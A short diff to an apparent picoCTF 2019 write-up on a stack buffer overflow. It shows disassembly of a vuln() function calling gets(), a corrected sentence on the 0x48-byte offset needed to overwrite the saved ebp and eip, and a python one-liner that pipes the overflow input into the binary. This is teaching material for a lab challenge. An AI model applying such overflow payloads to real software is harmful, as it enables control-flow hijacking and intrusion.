@@ -13,7 +13,7 @@ On taking a look at the disassembly of the vuln() function , we can clearly see 
 8048677:       50                      push   eax
 8048678:       e8 b3 fd ff ff          call   8048430 <gets@plt>
 ```
-So we need to give an input of 0x48 + 0x4 bytes (to override the saved ebp) + 0x4 bytes (to override the saved eip)
+So we need to give an input of 0x48 bytes + 0x4 bytes (to override the saved ebp) + 0x4 bytes (to override the saved eip)
 
 ```
 arch3r@1nv4d3r:~/p1c0CTF_2019/0v3rflow$ python -c 'print("A"*72+"B"*8)' | ./vuln
